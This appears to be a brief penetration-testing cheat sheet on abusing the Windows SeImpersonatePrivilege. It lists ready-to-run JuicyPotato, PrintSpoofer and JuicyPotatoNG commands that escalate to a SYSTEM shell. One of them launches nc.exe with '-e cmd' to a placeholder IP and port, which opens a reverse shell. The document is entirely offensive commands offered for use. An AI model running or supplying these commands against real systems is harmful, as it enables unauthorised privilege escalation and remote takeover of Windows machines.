# SeImpersonatePrivilege
wget #juicypotato
https://github.com/ohpe/juicy-potato
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

```
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c <CLSID>
```

#printspoofer
```
.\PrintSpoofer64.exe -i -c cmd.exe
```

#JuicyPotatoNG 
```
must use full paths, not interactive?
.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c C:\Users\[user]\nc.exe [ip] [port] -e cmd"
```